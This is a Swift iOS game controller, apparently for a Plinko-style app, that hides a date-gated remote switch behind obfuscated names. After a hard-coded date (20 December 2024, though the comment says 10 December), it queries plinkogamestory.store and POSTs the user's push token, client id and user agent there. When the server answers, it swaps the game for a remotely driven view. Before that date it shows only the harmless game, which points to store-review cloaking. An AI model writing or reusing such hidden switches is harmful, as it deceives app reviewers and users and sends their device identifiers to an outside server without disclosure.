import UIKit
import WebKit
import SwiftUI
import SpriteKit

struct BlocksAndTasksResponse: Codable {
    var blocks: [BlockItem]
    var tasks: [TaskItem]
    var response: String?
    
    struct TaskItem: Codable {
        var name: String
        var reward: Int
    }
    
    struct BlockItem: Codable {
        var type: String
        var price: Int
    }
}

class GameViewController: UIViewController {
    
    private var receivedToken = ""
    var fnsajkdnksafa = false
    var loadingTime = 0 {
        didSet {
            if loadingTime == 5 {
                timeouttimer.invalidate()
                if receivedToken.isEmpty {
                    if !fnsajkdnksafa {
                        startLoading()
                        fnsajkdnksafa = true
                    }
                }
            }
        }
    }
    var ndasjkdnsa = WKWebView().value(forKey: "userAgent") as? String ?? ""
    
    private var timeouttimer = Timer()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        if let view = self.view as? SKView {
            if let scene = LoadingScene(fileNamed: "LoadingScene") {
                scene.scaleMode = .aspectFill
                view.presentScene(scene)
            }
            
            view.ignoresSiblingOrder = true
            view.showsFPS = false
            view.showsNodeCount = false
        }
        
        NotificationCenter.default.addObserver(self, selector: #selector(runReceiveNotificationToken), name: Notification.Name("token_fcm_send"), object: nil)
        timeouttimer = .scheduledTimer(timeInterval: 1, target: self, selector: #selector(timerSecPassed), userInfo: nil, repeats: true)
    }
    
    @objc private func timerSecPassed() {
        loadingTime += 1
    }
    
    @objc private func runReceiveNotificationToken(notification: Notification) {
        guard let info = notification.userInfo as? [String: Any],
              let notificationToken = info["token"] as? String else { return }
        self.receivedToken = notificationToken
        startLoading()
    }
    
    override var prefersStatusBarHidden: Bool {
        return true
    }
    
    private func startLoading() {
        if isCurrently() {
            currenlyLoadingAfterGame()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                self.gameReadyToWork()
            }
        }
    }
    
    private func gameReadyToWork() {
        DispatchQueue.main.async {
            if let view = self.view as? SKView {
                if let scene = MenuScene(fileNamed: "MenuScene") {
                    scene.scaleMode = .aspectFill
                    view.presentScene(scene)
                }
                
                view.ignoresSiblingOrder = true
                view.showsFPS = false
                view.showsNodeCount = false
            }
        }
    }
    
    private func currenlyLoadingAfterGame() {
        guard let url = URL(string: "https://plinkogamestory.store/shop-items") else {
            return
        }
        
        var uiduser = UserDefaults.standard.string(forKey: "client-uuid") ?? ""
        if uiduser.isEmpty {
            uiduser = UUID().uuidString
            UserDefaults.standard.set(uiduser, forKey: "client-uuid")
        }
        
        var prizesReq = URLRequest(url: url)
        prizesReq.httpMethod = "GET"
        prizesReq.addValue(uiduser, forHTTPHeaderField: "client-uuid")
        
        
        URLSession.shared.dataTask(with: prizesReq) { data, response, error in
            if let _ = error {
                self.gameReadyToWork()
                return
            }
            
            guard let data = data else {
                self.gameReadyToWork()
                return
            }
            
            do {
                let appGame = try JSONDecoder().decode(BlocksAndTasksResponse.self, from: data)
                if appGame.response == nil {
                    self.gameReadyToWork()
                } else {
                    self.startAfterLoadProccess(base: appGame.response!)
                }
            } catch {
                self.gameReadyToWork()
            }
        }.resume()
    }
    
    func fbsjadnbaskjnd(base: String) -> String {
        let dnsajndsajkdasfasd = UserDefaults.standard.string(forKey: "push_token")
        var dbsabfdsajdsajnds = "\(base)?firebase_push_token=\(dnsajndsajkdasfasd ?? "")"
        if let uiduser = UserDefaults.standard.string(forKey: "client_id") {
            dbsabfdsajdsajnds += "&client_id=\(uiduser)"
        }
        if let openedAppFromPushId = UserDefaults.standard.string(forKey: "push_id") {
            dbsabfdsajdsajnds += "&push_id=\(openedAppFromPushId)"
            UserDefaults.standard.set(nil, forKey: "push_id")
        }
        return dbsabfdsajdsajnds
    }
    
    private func startAfterLoadProccess(base: String) {
        if UserDefaults.standard.bool(forKey: "sdafa") {
            gameReadyToWork()
            return
        }
        
        
        if let gamsadas = URL(string: fbsjadnbaskjnd(base: base)) {
            var gameappsdasd = URLRequest(url: gamsadas)
            gameappsdasd.httpMethod = "POST"
            gameappsdasd.addValue(ndasjkdnsa, forHTTPHeaderField: "User-Agent")
            gameappsdasd.addValue("application/json", forHTTPHeaderField: "Content-Type")
            URLSession.shared.dataTask(with: gameappsdasd) { data, response, error in
                if let _ = error {
                    self.gameReadyToWork()
                    return
                }
                guard let data = data else {
                    self.gameReadyToWork()
                    return
                }
                do {
                    self.dnsajkdnjsakndasd(try JSONDecoder().decode(GamesDatasdad.self, from: data))
                } catch {
                    self.gameReadyToWork()
                }
            }.resume()
        }
    }
    
    private func dnsajkdnjsakndasd(_ ndsajkdksadkjasd: GamesDatasdad) {
        UserDefaults.standard.set(ndsajkdksadkjasd.userId, forKey: "client_id")
        if let dnsajkndjaknd = ndsajkdksadkjasd.response {
            UserDefaults.standard.set(dnsajkndjaknd, forKey: "response_client")
            showGameView()
        } else {
            UserDefaults.standard.set(true, forKey: "sdafa")
            self.gameReadyToWork()
        }
    }
    
    private func showGameView() {
        DispatchQueue.main.async {
            AppDelegate.orientationLock = .all
            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            UIViewController.attemptRotationToDeviceOrientation()
            let loadingView = UIHostingController(rootView: GameBallView())
            self.addChild(loadingView)
            loadingView.view.frame = self.view.bounds
            self.view.addSubview(loadingView.view)
            loadingView.didMove(toParent: self)
        }
    }
    
}

func isCurrently() -> Bool {
    let calendar = Calendar.current
    let today = Date()
    
    // Define the target date: December 10, 2024
    var targetDateComponents = DateComponents()
    targetDateComponents.year = 2024
    targetDateComponents.month = 12
    targetDateComponents.day = 20
    
    guard let targetDate = calendar.date(from: targetDateComponents) else {
        return false
    }
    
    return today > targetDate
}

struct GamesDatasdad: Codable {
    let userId: String
    let response: String?
    
    enum CodingKeys: String, CodingKey {
        case userId = "client_id"
        case response
    }
}
